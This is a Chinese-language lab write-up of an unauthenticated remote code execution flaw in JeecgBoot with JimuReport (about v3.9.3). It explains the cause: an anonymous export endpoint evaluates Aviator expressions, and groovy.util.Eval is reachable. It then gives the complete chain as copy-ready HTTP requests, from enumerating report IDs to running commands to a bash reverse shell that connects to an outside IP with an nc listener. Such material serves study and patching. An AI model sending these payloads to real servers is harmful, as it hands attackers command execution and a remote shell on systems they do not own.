# 积木报表 JeecgBoot 3.9.3 pre-auth RCE

本篇记录 Ulab Web 靶场 CVE 专题的第一个漏洞：JeecgBoot（集成积木报表 JimuReport）低版本存在的未授权 RCE，从枚举报表 ID、命令执行到反弹 Shell 的完整利用过程。

## 一、漏洞概述

- **组件**：JeecgBoot + JimuReport（积木报表）低版本（目标 ≈ v3.9.3）
- **接口**：`POST /jeecg-boot/jmreport/auto/export`
- **根因**：`auto/export` 标注 `@JimuNoLoginRequired`（匿名放行），`reportParams[].params` 的值以 `=` 开头时，代码删除等号后交给 Aviator 表达式引擎执行。Aviator 仅禁用了 `NewInstance`，`use` + 静态方法仍可用，`groovy.util.Eval` 在 classpath 上，可拉起操作系统进程。
- **影响**：未授权 RCE（以 JeecgBoot 进程用户权限执行命令）

## 二、完整利用链

### 1. 枚举报表 ID（无需任何权限）

```
GET /jeecg-boot/jmreport/excelQueryByTemplate?name=&pageNo=1&pageSize=10
```

返回 JSON 数组，取任意一条 `records[].id`。本次使用 `907480464532770816`（主子报表循环块），其他内置报表 ID 同样可用。

### 2. 命令执行（RCE 验证，回显命令输出）

```
POST /jeecg-boot/jmreport/auto/export
Host: <target>
Content-Type: application/json
Accept: application/json

{"reportParams":[{"id":"907480464532770816","params":{"x":"=use groovy.util.Eval; Eval.me('[\"id\"].execute().text')"},"exportType":"pdf"}]}
```

### 3. 反弹 Shell

先在 VPS 上监听：

```
nc -lvnp 9001
```

```
POST /jeecg-boot/jmreport/auto/export
Host: <target>
Content-Type: application/json
Accept: application/json

{"reportParams":[{"id":"907480464532770816","params":{"x":"=use groovy.util.Eval; Eval.me('[\"bash\",\"-c\",\"bash -i >& /dev/tcp/43.154.18.23/9001 0>&1\"].execute()')"},"exportType":"pdf"}]}
```
